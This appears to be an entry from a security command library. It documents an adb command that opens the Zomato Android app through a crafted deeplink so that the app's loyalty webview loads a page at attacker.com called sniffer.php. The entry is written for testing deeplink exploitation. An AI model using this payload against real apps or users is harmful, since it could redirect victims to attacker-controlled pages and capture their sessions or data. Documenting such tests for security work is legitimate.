---
data: >-
  adb shell am start -a android.intent.action.VIEW -d
  "zomatodelivery://zloyaltywebview/?url=https://attacker.com/sniffer.php&navigation_bar_type=transparent"
  com.application.zomato
tags:
  - adb
  - intent-launch
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:18.210Z'
id: b8d3c1e7-566f-49c2-802a-1e6ddeb99019
verified: false
validated: true
submitted: true
---
# adb-start-intent

## Command

```bash
adb shell am start -a android.intent.action.VIEW -d "zomatodelivery://zloyaltywebview/?url=https://attacker.com/sniffer.php&navigation_bar_type=transparent" com.application.zomato
```

## Description

Starts an Android activity via ADB using a crafted intent to test deeplink exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-a android.intent.action.VIEW` | Intent action | Yes |
| `-d <URI>` | Data URI with scheme and params | Yes |
| `com.application.zomato` | Target package | Yes |

## Examples

### Basic Usage

```bash
adb shell am start -a android.intent.action.VIEW -d "zomatodelivery://..." com.application.zomato
```

### Advanced Usage

```bash
adb shell am start -a VIEW -d "scheme://host?param=value" -n com.pkg/.Activity
```

## Expected Output

Starting: Intent { act=VIEW dat=zomatodelivery://... } with app launch.

## Related

- [[Related Procedure]]
